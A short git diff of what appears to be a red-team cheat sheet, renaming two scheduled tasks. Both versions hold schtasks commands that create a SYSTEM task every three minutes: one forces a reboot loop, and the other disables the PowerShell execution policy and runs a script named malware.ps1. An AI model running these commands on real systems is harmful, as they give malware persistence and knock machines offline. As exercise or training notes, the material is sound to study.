@@ -13,10 +13,10 @@
 ## Scheduled Tasks
 ### Rolling Reboot
 ```bash
-schtasks.exe /create /ru "SYSTEM" /sc minute /mo 3 /tn "DONOVIA RULEZ" /tr "shutdown /r /t 000" 
+schtasks.exe /create /ru "SYSTEM" /sc minute /mo 3 /tn "Rolling Reboot" /tr "shutdown /r /t 000" 
 ```
 
 ### Run a Script
 ```bash
-schtasks.exe /create /ru "SYSTEM" /sc minute /mo 3 /tn "DONOVIA RULEZ" /tr "Set-ExecutionPolicy unrestricted; C:\malware.ps1" 
+schtasks.exe /create /ru "SYSTEM" /sc minute /mo 3 /tn "Run a Script" /tr "Set-ExecutionPolicy unrestricted; C:\malware.ps1" 
 ```
